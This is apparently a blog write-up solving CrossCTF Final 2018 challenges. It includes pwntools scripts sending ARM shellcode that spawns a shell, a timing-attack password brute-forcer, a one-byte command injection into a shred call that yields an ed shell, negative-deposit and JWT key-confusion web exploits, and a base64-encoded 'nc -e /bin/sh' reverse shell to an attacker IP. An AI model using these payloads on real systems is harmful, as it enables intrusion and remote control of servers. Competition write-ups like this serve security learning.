---
title: "Crossctf Final 2018 Writeup"
date: 2018-06-18T13:47:38+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: solves for CrossCTF Final 2018 challenges
---

# Perfect

## Problem

'Cause we lost it all Nothin' lasts forever

Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15

[perfect](/blog/crossctf-final-2018-writeup/Perfect/perfect)

## Solution

I went through the assembly code line by line converting it into something more readable:

```
local_420h = 2^213

get local_410h
local_440h = int(local_410h, 10) - 1
local_430h = int(local_410h, 10)

do {
  if (local_430h%local_440h == 0) {
    local_460h += local_440h
  }
  local_440h -= 1
} while (local_440h >= 0)

if (local_460h == local_430h && local_430h > local_420h) {
  // local_460h
  // WIN
}
```

In summary, the program need a [perfect number](https://en.wikipedia.org/wiki/Perfect_number) with a bit length larger than `213`.

By searching [online](http://mathforum.org/library/drmath/view/51516.html), I found the number to be `14474011154664524427946373126085988481573677491474835889066354349131199152128`.

```python
import random

random.seed(a=14474011154664524427946373126085988481573677491474835889066354349131199152128)

k = "".join([hex(random.randint(0, 255))[2:] for i in range(35)])

print(k)
```

This gives us the hex: `363c49bfa7f2ebe9c888d5d32be6ede8c1bfa2d9aea7595ff4419792896b96cfd2e1a6`

Then xoring that with `754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db`, you get the flag.

Flag: `CrossCTF{why_am_1_aw4ke_r1ght_n0ww}`

# FTLOG

## Problem

https://youtu.be/RW2vXFLXtps

nc ctf.pwn.sg 4004

Hint: The raspberry Pis might come in handy but you can look at using qemu too.

Creator - amon (@nn_amon)

## Solution

The ARM binary seems to just execute the input as shellcode.

Code:

```python
from pwn import *

sh = remote('ctf.pwn.sg', 4004)

sh.sendline('\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78')
sh.interactive()
```

Flag: `CrossCTF{slowmo_starroving_sugarforthepill_alison}`

# Sanity

## Problem

Insane in the membrane.

fXRoZzFsaHM0bGZfeW1fcjBveV8zc3U0Q3tGVENzc29yQw==

## Solution

Base64 decode and then reverse the order.

Flag: `CrossCTF{C4us3_yo0r_my_fl4shl1ght}`

# The Evilness

## Problem

Ready for something ridiculously difficult?

nc ctf.pwn.sg 4020

```python
#!/usr/bin/env python

import sys
import flag
import signal
import os
import tempfile

temp_file = tempfile.NamedTemporaryFile(prefix="cartoon-",
                                        suffix=".dat",
                                        delete=True)


def handler(signum, frame):
    write("Times up!")
    temp_file.close()
    sys.exit(0)


def write(data, endl='\n'):
    sys.stdout.write(data + endl)
    sys.stdout.flush()


def readline():
    return sys.stdin.readline().strip()


def main():
    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    # Write the flag to the temp file
    temp_file.file.write(flag.flag)
    temp_file.file.flush()

    # Oh I'm sorry, did you want this?
    del flag.flag

    write(open(__file__).read())

    command = "/usr/bin/shred " + temp_file.name
    write("Here comes the shredder! (%s)" % command)

    ######################################################################
    #
    # INCOMING TRANSMISSION...
    #
    # CAREFUL AGENT. WE DO NOT HAVE MUCH TIME. I'VE OPENED A WORMHOLE IN
    # THE FABRIC OF TIME AND SPACE TO INTRODUCE A FAULT IN ONE BYTE!
    #
    # MAKE USE OF IT WISELY!
    #
    command_fault = list(command)
    index = int(readline())
    byt = int(readline(), 16)
    if (0x0 <= index < len(command_fault)):
        if (0x0 <= byt <= 0xff):
            command_fault[index] = chr(byt)
            command = "".join(command_fault)
    #
    # TRANSMISSION ENDED
    #
    ######################################################################

    # Oooh, did you want this too? Too bad it's being... shredded.
    os.system(command)


if __name__ == "__main__":
    main()

Here comes the shredder! (/usr/bin/shred /tmp/cartoon-uoDUPm.dat)
```

## Solution

Basicly, we can change one character in `/usr/bin/shred /tmp/cartoon-RANDOM.dat`.

By changing `r` to a `;`, we can call `ed` a text editor with the file, using `p` we can read the file, and using `P` we can get a shell.

```
Here comes the shredder! (/usr/bin/shred /tmp/cartoon-xaIxJX.dat)
11
3B
sh: 1: /usr/bin/sh: not found
Newline appended
62
p
LOL YOU THOUGHT THIS WOULD BE SO EASY? GET A SHELL YOU DWEEB.
*ls
?
P
*!ls
flag
flag.py
requirements.txt
theevilness.py
!
*!cat flag
CrossCTF{it5_th3_r34ln3ss_th3_r3alness}
!
*
```

Flag: `CrossCTF{it5_th3_r34ln3ss_th3_r3alness}`

# Fitblips

## Problem

How many steps does your Fitblip beep?

nc ctf.pwn.sg 4003

Creator - amon (@nn_amon)

```python
#!/usr/bin/env python

import sys
import flag
from bitstring import BitArray
import time
import signal


def write(data, endl='\n'):
    sys.stdout.write(data + endl)
    sys.stdout.flush()


def readline():
    return sys.stdin.readline().strip()


def convert_to_bitstream(data):
    return BitArray(bytes=data).bin


def check(a, b, user_times):
    bs_a = convert_to_bitstream(a)
    bs_b = convert_to_bitstream(b)
    bs_a = bs_a.ljust(len(bs_b), "0")
    bs_b = bs_b.ljust(len(bs_a), "0")
    counter = 0
    for i in range(len(bs_a)):
        if bs_a[i] != bs_b[i]:
            return counter
        counter += 1
    return counter


def main():
    signal.alarm(4)

    secret_key = flag.flag
    write(open(__file__).read())
    write("Password: ", endl="")
    user_supplied = readline()
    write("How many times do you want to test: ", endl="")
    user_times_supplied = readline()
    try:
        int(user_supplied, 16)
        user_data = user_supplied.decode("hex")
        user_times = int(user_times_supplied)
    except Exception:
        write("Evil.")
        return

    if user_times > 5000:
        write("Too many times.")
        return

    result = len(flag.flag) * 8 * user_times
    start = time.time()
    for i in range(user_times):
        result -= check(user_data, secret_key, user_times)
    end = time.time()
    elapsed = end - start

    if result == 0:
        write("Flag is %s" % flag.flag)
    else:
        write("Impossible.")

    write("Request completed in: %.4fs (%d)" % (elapsed, result))


if __name__ == "__main__":
    main()

```

## Solution

The key to this challenge is to see that the correct flag takes longer and have a smaller `result` value.

```python

from pwn import *

def attempt(bitsStr):
  print bitsStr
  sh = remote('ctf.pwn.sg', 4003)
  sh.recvuntil('Password: ')
  sh.recvuntil('Password: ')
  sh.sendline(enhex(unbits([e for e in bitsStr.ljust(300, '0')], endian='big')))
  sh.recvuntil(': ')
  sh.sendline('10')
  output = sh.recvall()
  if (not 'Impossible.' in output.split('\n')[0]):
    print output
    exit(0)

  return int(output.split('\n')[-2].split(' ')[-1][1:-2])

password = ''

while True:
  r1 = attempt(password+'1')
  r2 = attempt(password+'0')
  print r1, r2
  if (r1 < r2):
    password = password+'1'
  else:
    password = password+'0'

```

Flag: `CrossCTF{t1m1ng_att4ck5_r_4_th3_d3vil}`

# GoCoin!

## Problem

I thought blockchain was cool, so I made my own coin.

http://ctf.pwn.sg:8182

Creator - quanyang (@quanyang)

## Solution

Because the deposit function doesn't check if `amount` is negative, by doing `http://ctf.pwn.sg:8182/deposit?amount=-100000`, we are able to buy the flag.

```
You deposited -100000 GoCoins! into your bank!
You have 100001 GoCoins! in your wallet and -100000 in your bank!
Deposit 1 GoCoins into your bank here!
Withdraw 1 GoCoins from your bank here!
Buy a flag for 1.337 GoCoins! here.
```

Flag: `CrossCTF{G0C0in_Is_Th3_Nex7_Bi5_Th@ng!}`

# GoCoin! Plus

## Problem

I thought blockchain was cool, so I made my own coin.

GoCoin! Plus is the forked and improved version of GoCoin!.

Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now!

http://ctf.pwn.sg:2053

Creator - quanyang (@quanyang)

## Solution

It is the same as `GoCoin!`.

`http://ctf.pwn.sg:2053/deposit?amount=-100000` still works.

Flag: `CrossCTF{GoCoin!_Cash_Is_th3_m0St_5eCur3!!!!13337}`

# GoCoin! Plus Plus

## Problem

I thought blockchain was cool, so I made my own coin.

GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.

Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!

http://ctf.pwn.sg:1389

Creator - quanyang (@quanyang)

[source](/blog/crossctf-final-2018-writeup/GoCoin!%20Plus%20Plus/source)

[pub.rsa](/blog/crossctf-final-2018-writeup/GoCoin!%20Plus%20Plus/pub.rsa)

## Solution

```go
token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {
    if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
        key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)
        return key, err
    }
    return myKey, nil
})
```

This is the part that is vulnerable. `myKey` can be both a rsa public key or a HMAC secret. Because HMAC is symmetric, we can change the info to whatever we like.

Using this [website](https://jwt.io/), we can hand craft our own jwt cookie to solve the challenge.

{{< figure src="/blog/crossctf-final-2018-writeup/GoCoin!%20Plus%20Plus/img.png" >}}

Flag: `CrossCTF{SORRY_I_AM_STUP!D!1!!1}`

# The Terminal

## Problem

How long more can you stand it?

http://ctf.pwn.sg:4083

## Solution

Most features on the website are distractions (we tried to find the flag in the cake image for a long time...)

In the end, we found `http://ctf.pwn.sg:4082/picturise/CMD` which allows us to run what ever command we like and return the output as a image.

Here is the url that we used in the end: `http://ctf.pwn.sg:4082/picturise/echo%20bmMgLWUgL2Jpbi9zaCAxNjUuMjI3LjI0MC4yMDQgODA=%20%7C%20base64%20-d%20%7C%20sh`

It is basically `echo PAYLOAD | base64 -d | sh`, and the payload is `nc -e /bin/sh ATTACK_IP 80` which opens up a reverse shell on th server (`nc -nvlp 80` on the attack server).

Then we can just do `grep -rnw '/' -e 'CrossCTF'` and get the flag.

Flag: `CrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on}`

# CacheCreek

## Problem

I wrote a new cache mechanism, it is pretty cool, can you please review it for me?

http://ctf.pwn.sg:8181

backup server: http://ftc1.pwn.sg:8181 http://ftc2.pwn.sg:8181

Creator - quanyang (@quanyang)

[internal.php](/blog/crossctf-final-2018-writeup/CacheCreek/internal.php)

[curl.php](/blog/crossctf-final-2018-writeup/CacheCreek/curl.php)

[cache.php](/blog/crossctf-final-2018-writeup/CacheCreek/cache.php)

## Solution

```php

...
$debug = url_get_contents("http://127.0.0.1/internal.php?debug". session_id(), 60, "index.php",['debug'=>'True']);
...
echo htmlentities(url_get_contents("http://127.0.0.1/internal.php?". session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'=>'admin']));
...
```

If we append `debug` to our current session, update the profile to our payload, log back using the original session id, and call debug, we are then able to execute any command on the server.

```
debug command: grep -rnw '/' -e 'CrossCTF'

/flag.txt:1:CrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3}
```

Flag: `Dont_h@te_tHe_aUth0r_hat3_d@_gam3`

# Other resources

[ahboon/Crossctf2018](https://github.com/ahboon/Crossctf2018/tree/master/Writeups)

[NUSGreyhats/crossctf-2018-challenges](https://github.com/NUSGreyhats/crossctf-2018-challenges)